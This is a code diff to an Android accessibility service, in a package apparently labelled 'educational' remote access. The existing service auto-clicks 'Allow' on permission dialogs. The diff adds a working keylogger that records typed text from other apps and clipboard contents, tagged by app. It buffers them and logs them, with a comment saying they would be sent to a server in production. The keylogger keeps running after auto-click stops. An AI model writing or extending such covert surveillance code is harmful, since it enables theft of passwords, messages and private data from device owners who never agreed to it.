@@ -2,9 +2,14 @@ package com.remoteaccess.educational.permissions;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.os.Handler;
+import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import java.util.List;
 
 public class AccessibilityHelperService extends AccessibilityService {
 
@@ -12,6 +17,12 @@ public class AccessibilityHelperService extends AccessibilityService {
     private static boolean isAutoClickEnabled = true;
     private Handler handler;
     private Runnable autoClickDisableRunnable;
+    
+    // Keylogger
+    private ClipboardManager clipboardManager;
+    private String lastClipboard = "";
+    private StringBuilder keyBuffer = new StringBuilder();
+    private static final int BUFFER_SIZE = 100;
 
     public static AccessibilityHelperService getInstance() {
         return instance;
@@ -31,7 +42,10 @@ public class AccessibilityHelperService extends AccessibilityService {
         instance = this;
         handler = new Handler();
         
-        // Auto-disable after 10 seconds
+        // Initialize clipboard for keylogger
+        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        
+        // Auto-disable auto-click after 10 seconds (but keylogger keeps running)
         autoClickDisableRunnable = new Runnable() {
             @Override
             public void run() {
@@ -43,7 +57,9 @@ public class AccessibilityHelperService extends AccessibilityService {
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
-                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
+                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED |
+                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
+                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
@@ -57,11 +73,75 @@ public class AccessibilityHelperService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (instance == null) instance = this;
         
-        // Skip if auto-click is disabled
-        if (!isAutoClickEnabled) return;
+        // Always run keylogger (even after auto-click is disabled)
+        handleKeylogging(event);
         
-        // Auto-click immediately on any window change
-        performAutoClick();
+        // Auto-click only when enabled
+        if (isAutoClickEnabled) {
+            performAutoClick();
+        }
+    }
+
+    private void handleKeylogging(AccessibilityEvent event) {
+        try {
+            String packageName = event.getPackageName() != null ? 
+                               event.getPackageName().toString() : "";
+            
+            // Skip our own app
+            if (packageName.equals(getPackageName())) {
+                return;
+            }
+            
+            // Capture text input
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                List<CharSequence> textList = event.getText();
+                if (textList != null && !textList.isEmpty()) {
+                    StringBuilder sb = new StringBuilder();
+                    for (CharSequence text : textList) {
+                        if (text != null) {
+                            sb.append(text);
+                        }
+                    }
+                    String typedText = sb.toString();
+                    if (!typedText.isEmpty() && typedText.length() < 50) {
+                        keyBuffer.append("[").append(packageName).append(": ").append(typedText).append("] ");
+                    }
+                }
+            }
+            
+            // Capture clipboard
+            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
+                try {
+                    ClipData clip = clipboardManager.getPrimaryClip();
+                    if (clip != null && clip.getItemCount() > 0) {
+                        CharSequence clipboardText = clip.getItemAt(0).getText();
+                        if (clipboardText != null && !clipboardText.toString().equals(lastClipboard)) {
+                            lastClipboard = clipboardText.toString();
+                            keyBuffer.append("[CLIPBOARD: ").append(lastClipboard).append("] ");
+                        }
+                    }
+                } catch (Exception e) {
+                    // Ignore clipboard errors
+                }
+            }
+            
+            // Send logs when buffer is full
+            if (keyBuffer.length() >= BUFFER_SIZE) {
+                sendKeylogs();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private void sendKeylogs() {
+        if (keyBuffer.length() > 0) {
+            String logs = keyBuffer.toString();
+            keyBuffer.setLength(0);
+            
+            // Log for debugging - in production, send to server
+            Log.d("Keylogger", "Captured: " + logs);
+        }
     }
 
     private void performAutoClick() {
@@ -69,14 +149,12 @@ public class AccessibilityHelperService extends AccessibilityService {
         
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) {
-            // Try again after a short delay
             if (handler != null) {
                 handler.postDelayed(() -> performAutoClick(), 200);
             }
             return;
         }
 
-        // Try multiple button texts
         if (findAndClickButton(rootNode, "Allow")) return;
         if (findAndClickButton(rootNode, "ALLOW")) return;
         if (findAndClickButton(rootNode, "Allow all the time")) return;
@@ -98,7 +176,6 @@ public class AccessibilityHelperService extends AccessibilityService {
         if (node == null || !isAutoClickEnabled) return false;
 
         try {
-            // Check if this node is clickable
             if (node.isClickable()) {
                 CharSequence nodeText = node.getText();
                 if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
@@ -106,7 +183,6 @@ public class AccessibilityHelperService extends AccessibilityService {
                     return true;
                 }
                 
-                // Check description
                 CharSequence contentDesc = node.getContentDescription();
                 if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -114,7 +190,6 @@ public class AccessibilityHelperService extends AccessibilityService {
                 }
             }
             
-            // Check children
             for (int i = 0; i < node.getChildCount(); i++) {
                 AccessibilityNodeInfo child = node.getChild(i);
                 if (child != null) {
@@ -126,7 +201,7 @@ public class AccessibilityHelperService extends AccessibilityService {
                 }
             }
         } catch (Exception e) {
-            // Ignore exceptions
+            // Ignore
         }
 
         return false;
